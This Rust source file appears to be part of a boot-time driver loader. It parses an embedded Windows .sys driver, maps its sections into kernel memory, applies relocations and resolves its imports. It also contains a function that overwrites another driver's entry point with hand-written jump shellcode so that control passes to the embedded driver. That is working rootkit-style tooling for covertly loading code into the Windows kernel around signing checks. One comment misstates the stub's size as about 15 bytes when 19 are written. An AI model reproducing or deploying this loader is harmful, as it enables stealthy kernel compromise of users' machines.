/// PE mapper: parse embedded driver, map sections, apply relocations.
///
/// The driver .sys is embedded at compile time via include_bytes!().
/// At boot, we parse the PE headers, copy sections to allocated kernel memory,
/// and fix up relocations so the driver can execute at its new base address.

use core::ptr;

// ── PE structures (minimal subset needed for mapping) ──

#[repr(C, packed)]
#[derive(Clone, Copy)]
pub struct ImageDosHeader {
    pub e_magic: u16,    // MZ
    pub _pad: [u8; 58],
    pub e_lfanew: u32,   // offset to NT headers
}

#[repr(C, packed)]
#[derive(Clone, Copy)]
pub struct ImageNtHeaders64 {
    pub signature: u32,   // PE\0\0
    pub file_header: ImageFileHeader,
    pub optional_header: ImageOptionalHeader64,
}

#[repr(C, packed)]
#[derive(Clone, Copy)]
pub struct ImageFileHeader {
    pub machine: u16,
    pub number_of_sections: u16,
    pub time_date_stamp: u32,
    pub pointer_to_symbol_table: u32,
    pub number_of_symbols: u32,
    pub size_of_optional_header: u16,
    pub characteristics: u16,
}

#[repr(C, packed)]
#[derive(Clone, Copy)]
pub struct ImageOptionalHeader64 {
    pub magic: u16,
    pub major_linker_version: u8,
    pub minor_linker_version: u8,
    pub size_of_code: u32,
    pub size_of_initialized_data: u32,
    pub size_of_uninitialized_data: u32,
    pub address_of_entry_point: u32,
    pub base_of_code: u32,
    pub image_base: u64,
    pub section_alignment: u32,
    pub file_alignment: u32,
    pub major_os_version: u16,
    pub minor_os_version: u16,
    pub major_image_version: u16,
    pub minor_image_version: u16,
    pub major_subsystem_version: u16,
    pub minor_subsystem_version: u16,
    pub win32_version_value: u32,
    pub size_of_image: u32,
    pub size_of_headers: u32,
    pub checksum: u32,
    pub subsystem: u16,
    pub dll_characteristics: u16,
    pub size_of_stack_reserve: u64,
    pub size_of_stack_commit: u64,
    pub size_of_heap_reserve: u64,
    pub size_of_heap_commit: u64,
    pub loader_flags: u32,
    pub number_of_rva_and_sizes: u32,
    pub data_directory: [ImageDataDirectory; 16],
}

#[repr(C, packed)]
#[derive(Clone, Copy)]
pub struct ImageDataDirectory {
    pub virtual_address: u32,
    pub size: u32,
}

#[repr(C, packed)]
#[derive(Clone, Copy)]
pub struct ImageSectionHeader {
    pub name: [u8; 8],
    pub virtual_size: u32,
    pub virtual_address: u32,
    pub size_of_raw_data: u32,
    pub pointer_to_raw_data: u32,
    pub pointer_to_relocations: u32,
    pub pointer_to_line_numbers: u32,
    pub number_of_relocations: u16,
    pub number_of_line_numbers: u16,
    pub characteristics: u32,
}

#[repr(C, packed)]
#[derive(Clone, Copy)]
pub struct ImageBaseRelocation {
    pub virtual_address: u32,
    pub size_of_block: u32,
}

// ── Import structures ──

#[repr(C, packed)]
#[derive(Clone, Copy)]
pub struct ImageImportDescriptor {
    pub original_first_thunk: u32, // RVA to INT (Import Name Table)
    pub time_date_stamp: u32,
    pub forwarder_chain: u32,
    pub name: u32,                 // RVA to DLL name
    pub first_thunk: u32,          // RVA to IAT (Import Address Table)
}

#[repr(C, packed)]
#[derive(Clone, Copy)]
pub struct ImageExportDirectory {
    pub characteristics: u32,
    pub time_date_stamp: u32,
    pub major_version: u16,
    pub minor_version: u16,
    pub name: u32,
    pub base: u32,
    pub number_of_functions: u32,
    pub number_of_names: u32,
    pub address_of_functions: u32,
    pub address_of_names: u32,
    pub address_of_name_ordinals: u32,
}

// Relocation types
const IMAGE_REL_BASED_ABSOLUTE: u16 = 0;
const IMAGE_REL_BASED_DIR64: u16 = 10;

// Data directory indices
const IMAGE_DIRECTORY_ENTRY_EXPORT: usize = 0;
const IMAGE_DIRECTORY_ENTRY_IMPORT: usize = 1;
const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;

const IMAGE_ORDINAL_FLAG64: u64 = 0x8000000000000000;

/// Information about the embedded driver PE
pub struct DriverPeInfo {
    pub entry_point_rva: u32,
    pub size_of_image: u32,
    pub image_base: u64,
    pub num_sections: u16,
}

/// Parse the PE headers of the embedded driver.
pub unsafe fn parse_driver_pe(driver_data: &[u8]) -> Option<DriverPeInfo> {
    if driver_data.len() < core::mem::size_of::<ImageDosHeader>() {
        return None;
    }

    let dos = &*(driver_data.as_ptr() as *const ImageDosHeader);
    if dos.e_magic != 0x5A4D {
        return None;
    }

    let nt_offset = dos.e_lfanew as usize;
    if nt_offset + core::mem::size_of::<ImageNtHeaders64>() > driver_data.len() {
        return None;
    }

    let nt = &*(driver_data.as_ptr().add(nt_offset) as *const ImageNtHeaders64);
    if nt.signature != 0x00004550 {
        return None;
    }

    Some(DriverPeInfo {
        entry_point_rva: nt.optional_header.address_of_entry_point,
        size_of_image: nt.optional_header.size_of_image,
        image_base: nt.optional_header.image_base,
        num_sections: nt.file_header.number_of_sections,
    })
}

/// Map the driver PE sections into the target buffer.
/// `target` must be at least `size_of_image` bytes.
/// Returns the entry point address.
pub unsafe fn map_driver(
    driver_data: &[u8],
    target: *mut u8,
    target_size: usize,
) -> Option<*const u8> {
    let dos = &*(driver_data.as_ptr() as *const ImageDosHeader);
    let nt = &*(driver_data.as_ptr().add(dos.e_lfanew as usize) as *const ImageNtHeaders64);

    let size_of_image = nt.optional_header.size_of_image as usize;
    if target_size < size_of_image {
        return None;
    }

    // Zero the target buffer
    ptr::write_bytes(target, 0, size_of_image);

    // Copy headers
    let headers_size = nt.optional_header.size_of_headers as usize;
    ptr::copy_nonoverlapping(driver_data.as_ptr(), target, headers_size);

    // Copy sections
    let section_offset = dos.e_lfanew as usize
        + 4  // signature
        + core::mem::size_of::<ImageFileHeader>()
        + nt.file_header.size_of_optional_header as usize;

    let num_sections = nt.file_header.number_of_sections as usize;

    for i in 0..num_sections {
        let sec = &*(driver_data.as_ptr().add(
            section_offset + i * core::mem::size_of::<ImageSectionHeader>(),
        ) as *const ImageSectionHeader);

        if sec.size_of_raw_data == 0 {
            continue;
        }

        let src = driver_data.as_ptr().add(sec.pointer_to_raw_data as usize);
        let dst = target.add(sec.virtual_address as usize);
        let copy_size = core::cmp::min(sec.size_of_raw_data, sec.virtual_size) as usize;

        if sec.pointer_to_raw_data as usize + copy_size <= driver_data.len()
            && sec.virtual_address as usize + copy_size <= target_size
        {
            ptr::copy_nonoverlapping(src, dst, copy_size);
        }
    }

    // Apply base relocations
    let delta = target as u64 - nt.optional_header.image_base;
    if delta != 0 {
        apply_relocations(target, nt, delta);
    }

    // Return entry point
    let entry_rva = nt.optional_header.address_of_entry_point as usize;
    if entry_rva == 0 {
        return None;
    }

    Some(target.add(entry_rva))
}

/// Apply base relocations to the mapped image.
unsafe fn apply_relocations(base: *mut u8, nt: &ImageNtHeaders64, delta: u64) {
    let reloc_dir = &nt.optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if reloc_dir.virtual_address == 0 || reloc_dir.size == 0 {
        return;
    }

    let mut offset = 0u32;
    let reloc_base = base.add(reloc_dir.virtual_address as usize);
    let reloc_size = reloc_dir.size;

    while offset < reloc_size {
        let block = &*(reloc_base.add(offset as usize) as *const ImageBaseRelocation);

        if block.size_of_block == 0 {
            break;
        }

        let num_entries =
            (block.size_of_block as usize - core::mem::size_of::<ImageBaseRelocation>()) / 2;
        let entries_ptr = reloc_base
            .add(offset as usize)
            .add(core::mem::size_of::<ImageBaseRelocation>())
            as *const u16;

        for i in 0..num_entries {
            let entry = *entries_ptr.add(i);
            let reloc_type = (entry >> 12) as u16;
            let reloc_offset = (entry & 0x0FFF) as u32;

            match reloc_type {
                IMAGE_REL_BASED_ABSOLUTE => {
                    // Skip padding entries
                }
                IMAGE_REL_BASED_DIR64 => {
                    let patch_addr =
                        base.add((block.virtual_address + reloc_offset) as usize) as *mut u64;
                    let current = ptr::read_unaligned(patch_addr);
                    ptr::write_unaligned(patch_addr, current.wrapping_add(delta));
                }
                _ => {
                    // Unsupported relocation type — skip
                }
            }
        }

        offset += block.size_of_block;
    }
}

/// Hijack a target driver's entry point with a JMP to our driver.
/// Saves the original entry bytes at `save_buf` (must be >= 32 bytes).
///
/// The shellcode written at the hijacked entry:
///   lea r8, [rip - 7]        ; r8 = address of this shellcode (for identification)
///   mov rax, <our_entry>
///   jmp rax
///
/// Total: ~15 bytes
pub unsafe fn hijack_entry_point(
    target_entry: *mut u8,
    our_entry: *const u8,
    save_buf: *mut u8,
    save_len: usize,
) {
    // Save original bytes
    let copy_len = core::cmp::min(save_len, 32);
    ptr::copy_nonoverlapping(target_entry, save_buf, copy_len);

    // LEA R8, [RIP-7]  =>  4C 8D 05 F9 FF FF FF
    let shellcode: [u8; 7] = [0x4C, 0x8D, 0x05, 0xF9, 0xFF, 0xFF, 0xFF];
    ptr::copy_nonoverlapping(shellcode.as_ptr(), target_entry, 7);

    // MOV RAX, imm64    =>  48 B8 <8 bytes>
    *target_entry.add(7) = 0x48;
    *target_entry.add(8) = 0xB8;
    ptr::copy_nonoverlapping(
        &(our_entry as u64) as *const u64 as *const u8,
        target_entry.add(9),
        8,
    );

    // JMP RAX           =>  FF E0
    *target_entry.add(17) = 0xFF;
    *target_entry.add(18) = 0xE0;
}

/// Resolve all imports in the mapped driver image.
/// `module_resolver` is called with the DLL name and returns the module base, or None.
pub unsafe fn resolve_imports(
    mapped_base: *mut u8,
    module_resolver: &dyn Fn(&[u8]) -> Option<*const u8>,
) -> bool {
    let dos = &*(mapped_base as *const ImageDosHeader);
    let nt = &*(mapped_base.add(dos.e_lfanew as usize) as *const ImageNtHeaders64);

    let import_dir = &nt.optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if import_dir.virtual_address == 0 || import_dir.size == 0 {
        return true; // No imports — OK
    }

    let mut desc_ptr = mapped_base.add(import_dir.virtual_address as usize)
        as *const ImageImportDescriptor;

    loop {
        let desc = *desc_ptr;
        if desc.name == 0 {
            break;
        }

        // Read DLL name
        let dll_name_ptr = mapped_base.add(desc.name as usize);
        let dll_name = read_cstr(dll_name_ptr);

        // Find the module base
        let module_base = match module_resolver(dll_name) {
            Some(base) => base,
            None => {
                log::error!("[!] Import DLL not found: {:?}",
                    core::str::from_utf8(dll_name).unwrap_or("???"));
                return false;
            }
        };

        // Walk the thunk arrays
        let use_original = desc.original_first_thunk != 0;
        let int_rva = if use_original { desc.original_first_thunk } else { desc.first_thunk };
        let mut int_ptr = mapped_base.add(int_rva as usize) as *const u64;
        let mut iat_ptr = mapped_base.add(desc.first_thunk as usize) as *mut u64;

        loop {
            let thunk = ptr::read_unaligned(int_ptr);
            if thunk == 0 {
                break;
            }

            let resolved = if thunk & IMAGE_ORDINAL_FLAG64 != 0 {
                // Import by ordinal
                let ordinal = (thunk & 0xFFFF) as u16;
                resolve_export_by_ordinal(module_base, ordinal)
            } else {
                // Import by name — thunk is RVA to IMAGE_IMPORT_BY_NAME
                let hint_name = mapped_base.add(thunk as usize);
                let _hint = ptr::read_unaligned(hint_name as *const u16);
                let func_name = read_cstr(hint_name.add(2));
                resolve_export_by_name(module_base, func_name)
            };

            match resolved {
                Some(addr) => {
                    ptr::write_unaligned(iat_ptr, addr as u64);
                }
                None => {
                    log::warn!("[!] Unresolved import in {:?}",
                        core::str::from_utf8(dll_name).unwrap_or("???"));
                    // Write 0 — will crash if called, but don't fail the whole import
                    ptr::write_unaligned(iat_ptr, 0u64);
                }
            }

            int_ptr = int_ptr.add(1);
            iat_ptr = iat_ptr.add(1);
        }

        desc_ptr = desc_ptr.add(1);
    }

    true
}

/// Resolve an export by name from a PE module loaded in memory.
pub unsafe fn resolve_export_by_name(module_base: *const u8, name: &[u8]) -> Option<*const u8> {
    let dos = &*(module_base as *const ImageDosHeader);
    let nt = &*(module_base.add(dos.e_lfanew as usize) as *const ImageNtHeaders64);

    let export_dir_entry = &nt.optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if export_dir_entry.virtual_address == 0 {
        return None;
    }

    let export_dir = &*(module_base.add(export_dir_entry.virtual_address as usize)
        as *const ImageExportDirectory);

    let names = module_base.add(export_dir.address_of_names as usize) as *const u32;
    let ordinals = module_base.add(export_dir.address_of_name_ordinals as usize) as *const u16;
    let functions = module_base.add(export_dir.address_of_functions as usize) as *const u32;

    for i in 0..export_dir.number_of_names as usize {
        let name_rva = ptr::read_unaligned(names.add(i));
        let export_name = read_cstr(module_base.add(name_rva as usize));

        if cstr_eq(export_name, name) {
            let ordinal = ptr::read_unaligned(ordinals.add(i)) as usize;
            let func_rva = ptr::read_unaligned(functions.add(ordinal));

            // Check for forwarded export (RVA points inside export directory)
            let export_start = export_dir_entry.virtual_address;
            let export_end = export_start + export_dir_entry.size;
            if func_rva >= export_start && func_rva < export_end {
                // Forwarded — skip for now
                return None;
            }

            return Some(module_base.add(func_rva as usize));
        }
    }

    None
}

/// Resolve an export by ordinal.
pub unsafe fn resolve_export_by_ordinal(module_base: *const u8, ordinal: u16) -> Option<*const u8> {
    let dos = &*(module_base as *const ImageDosHeader);
    let nt = &*(module_base.add(dos.e_lfanew as usize) as *const ImageNtHeaders64);

    let export_dir_entry = &nt.optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if export_dir_entry.virtual_address == 0 {
        return None;
    }

    let export_dir = &*(module_base.add(export_dir_entry.virtual_address as usize)
        as *const ImageExportDirectory);

    let functions = module_base.add(export_dir.address_of_functions as usize) as *const u32;
    let index = ordinal as u32 - export_dir.base;

    if index >= export_dir.number_of_functions {
        return None;
    }

    let func_rva = ptr::read_unaligned(functions.add(index as usize));
    if func_rva == 0 {
        return None;
    }

    Some(module_base.add(func_rva as usize))
}

/// Read a null-terminated C string from a pointer, returning the slice (without null).
unsafe fn read_cstr(ptr: *const u8) -> &'static [u8] {
    let mut len = 0;
    while *ptr.add(len) != 0 {
        len += 1;
        if len > 512 { break; }
    }
    core::slice::from_raw_parts(ptr, len)
}

/// Compare two C-string-like byte slices case-insensitively.
fn cstr_eq(a: &[u8], b: &[u8]) -> bool {
    if a.len() != b.len() {
        return false;
    }
    for i in 0..a.len() {
        if a[i].to_ascii_lowercase() != b[i].to_ascii_lowercase() {
            return false;
        }
    }
    true
}

/// Case-insensitive comparison for DLL names (with or without .dll extension).
pub fn dll_name_matches(name: &[u8], target: &[u8]) -> bool {
    if cstr_eq(name, target) {
        return true;
    }
    // Try without .dll extension
    if name.len() > 4 {
        let without_ext = &name[..name.len() - 4];
        let ext = &name[name.len() - 4..];
        if cstr_eq(ext, b".dll") || cstr_eq(ext, b".DLL") {
            return cstr_eq(without_ext, target);
        }
    }
    if target.len() > 4 {
        let without_ext = &target[..target.len() - 4];
        let ext = &target[target.len() - 4..];
        if cstr_eq(ext, b".dll") || cstr_eq(ext, b".DLL") || cstr_eq(ext, b".sys") || cstr_eq(ext, b".SYS") {
            return cstr_eq(name, without_ext);
        }
    }
    false
}

/// Find a section by name in the mapped PE.
pub unsafe fn find_section(
    base: *const u8,
    name: &[u8; 8],
) -> Option<(*const u8, usize)> {
    let dos = &*(base as *const ImageDosHeader);
    let nt = &*(base.add(dos.e_lfanew as usize) as *const ImageNtHeaders64);

    let section_offset = dos.e_lfanew as usize
        + 4
        + core::mem::size_of::<ImageFileHeader>()
        + nt.file_header.size_of_optional_header as usize;

    for i in 0..nt.file_header.number_of_sections as usize {
        let sec = &*(base.add(
            section_offset + i * core::mem::size_of::<ImageSectionHeader>(),
        ) as *const ImageSectionHeader);

        if &sec.name == name {
            return Some((
                base.add(sec.virtual_address as usize),
                sec.virtual_size as usize,
            ));
        }
    }
    None
}
